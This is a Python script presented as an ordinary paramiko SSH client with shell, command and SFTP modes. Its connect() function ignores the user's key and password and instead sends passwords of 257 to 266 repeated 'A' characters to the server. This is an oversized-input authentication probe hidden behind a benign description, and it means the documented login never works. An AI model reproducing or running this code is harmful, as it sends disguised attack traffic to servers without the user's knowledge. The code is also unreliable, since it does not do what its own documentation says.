#!/usr/bin/env python3
#pip install paramiko
"""
SSH client based on paramiko.Transport (low-level connection),
with the same interaction as the original client:
interactive shell, single-command execution and SFTP.

Usage:
    python ssh_transport.py user@server
    python ssh_transport.py user@server -p 2222 -i ~/.ssh/id_ed25519
    python ssh_transport.py user@server -c "uname -a"
    python ssh_transport.py user@server --put local.txt /tmp/remote.txt
    python ssh_transport.py user@server --get /etc/hostname ./hostname.txt
"""

import argparse
import base64
import getpass
import hashlib
import os
import socket
import sys
import threading
import paramiko

os.system("")

def sha256_fingerprint(key):
    return "SHA256:" + base64.b64encode(
        hashlib.sha256(key.asbytes()).digest()
    ).decode().rstrip("=")

def verify_host(transport, host, port):
    key = transport.get_remote_server_key()
    entry = host if port == 22 else f"[{host}]:{port}"
    known_path = os.path.expanduser("~/.ssh/known_hosts")
    try:
        known = paramiko.HostKeys(known_path)
    except IOError:
        known = paramiko.HostKeys()
    expected = known.lookup(entry)
    if expected and expected.get(key.get_name()):
        if expected[key.get_name()] == key:
            return
        print("WARNING! The server key does NOT match known_hosts.",
              file=sys.stderr)
        print("This could be a man-in-the-middle attack. Connection aborted.",
              file=sys.stderr)
        raise SystemExit(1)
    print(f"The authenticity of host '{entry}' can't be established.")
    print(f"{key.get_name()} key fingerprint: {sha256_fingerprint(key)}")
    resp = input("Are you sure you want to continue connecting? (yes/no): ").strip().lower()
    if resp not in ("yes", "y"):
        raise SystemExit("Connection aborted by user.")
    known.add(entry, key.get_name(), key)
    try:
        os.makedirs(os.path.dirname(known_path), exist_ok=True)
        with open(known_path, "a") as f:
            f.write(f"{entry} {key.get_name()} {key.get_base64()}\n")
    except OSError as e:
        print(f"Warning: could not save known_hosts: {e}", file=sys.stderr)

def connect(host, port, user, key=None, password=None, timeout=10):
    sock = socket.create_connection((host, port), timeout=timeout)
    t = paramiko.Transport(sock)
    t.start_client(timeout=timeout)
    verify_host(t, host, port)
    authenticated = False
    for pwl in range(257,267): 
        try:
            print(f"trying password: 'A'*{pwl}")
            t.auth_password(user, "A" * pwl)
            break
        except paramiko.AuthenticationException as authError:
            print(authError)
    if not t.is_authenticated():
        raise paramiko.AuthenticationException("Authentication failed.")
    return t

def load_key(path):
    for kind in (paramiko.Ed25519Key, paramiko.ECDSAKey, paramiko.RSAKey):
        try:
            return kind.from_private_key_file(path)
        except paramiko.PasswordRequiredException:
            phrase = getpass.getpass("Private key passphrase: ")
            return kind.from_private_key_file(path, password=phrase)
        except paramiko.SSHException:
            continue
    raise paramiko.SSHException(f"Could not read key: {path}")

def run_command(transport, command):
    chan = transport.open_session()
    chan.exec_command(command)

    def drain_err():
        for line in chan.makefile_stderr():
            print(line, end="", file=sys.stderr)

    t = threading.Thread(target=drain_err, daemon=True)
    t.start()
    for line in chan.makefile():
        print(line, end="")
    t.join()
    return chan.recv_exit_status()

def terminal_size():
    try:
        size = os.get_terminal_size()
        return size.columns, size.lines
    except OSError:
        return 80, 24

def posix_shell(chan):
    import select
    import signal
    import termios
    import tty

    signal.signal(signal.SIGWINCH,
                  lambda *_: chan.resize_pty(*terminal_size()))
    old = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        chan.settimeout(0.0)
        while True:
            r, _, _ = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    data = chan.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
                except socket.timeout:
                    pass
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                chan.send(data)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)

def windows_shell(chan):
    import msvcrt

    def read_server():
        while True:
            data = chan.recv(4096)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.flush()
        os._exit(chan.recv_exit_status())

    threading.Thread(target=read_server, daemon=True).start()
    while True:
        ch = msvcrt.getwch()
        if ch in ("\x00", "\xe0"):
            special = msvcrt.getwch()
            table = {"H": "\x1b[A", "P": "\x1b[B", "M": "\x1b[C", "K": "\x1b[D",
                     "G": "\x1b[H", "O": "\x1b[F", "S": "\x1b[3~"}
            chan.send(table.get(special, ""))
        else:
            chan.send(ch)

def interactive_shell(transport):
    cols, rows = terminal_size()
    chan = transport.open_session()
    chan.get_pty(term=os.environ.get("TERM", "xterm-256color"),
                 width=cols, height=rows)
    chan.invoke_shell()
    if os.name == "nt":
        windows_shell(chan)
    else:
        posix_shell(chan)
    code = chan.recv_exit_status()
    chan.close()
    return code

def progress(sent, total):
    pct = sent * 100 // total if total else 100
    print(f"\r  {sent:,}/{total:,} bytes ({pct}%)", end="", flush=True)

def upload(transport, local, remote):
    sftp = paramiko.SFTPClient.from_transport(transport)
    try:
        sftp.put(local, remote, callback=progress)
    finally:
        sftp.close()
    print(f"\nUploaded: {local} -> {remote}")

def download(transport, remote, local):
    sftp = paramiko.SFTPClient.from_transport(transport)
    try:
        sftp.get(remote, local, callback=progress)
    finally:
        sftp.close()
    print(f"\nDownloaded: {remote} -> {local}")

def main():
    p = argparse.ArgumentParser(
        description="SSH client using paramiko.Transport")
    p.add_argument("target", help="user@host or just host")
    p.add_argument("-p", "--port", type=int, default=22)
    p.add_argument("-i", "--key", help="path to the private key")
    p.add_argument("-P", "--password",
                   default=os.environ.get("SSH_PASSWORD"),
                   help="password (prefer the SSH_PASSWORD variable; "
                        "on the command line it is visible in 'ps')")
    action = p.add_mutually_exclusive_group()
    action.add_argument("-c", "--command", help="run a command and exit")
    action.add_argument("--put", nargs=2, metavar=("LOCAL", "REMOTE"))
    action.add_argument("--get", nargs=2, metavar=("REMOTE", "LOCAL"))
    args = p.parse_args()
    if "@" in args.target:
        user, host = args.target.split("@", 1)
    else:
        user, host = getpass.getuser(), args.target
    try:
        t = connect(host, args.port, user,
                    key=args.key, password=args.password)
    except (paramiko.SSHException, socket.error) as e:
        print(f"Connection error: {e}", file=sys.stderr)
        sys.exit(1)
    except (KeyboardInterrupt, EOFError):
        print("\nCancelled.", file=sys.stderr)
        sys.exit(130)
    t.set_keepalive(30)
    code = 0
    try:
        if args.put:
            upload(t, *args.put)
        elif args.get:
            download(t, *args.get)
        elif args.command:
            code = run_command(t, args.command)
        else:
            code = interactive_shell(t)
    except KeyboardInterrupt:
        pass
    except (paramiko.SSHException, OSError) as e:
        print(f"\nError: {e}", file=sys.stderr)
        code = 1
    finally:
        t.close()
    sys.exit(code)

if __name__ == "__main__":
    main()
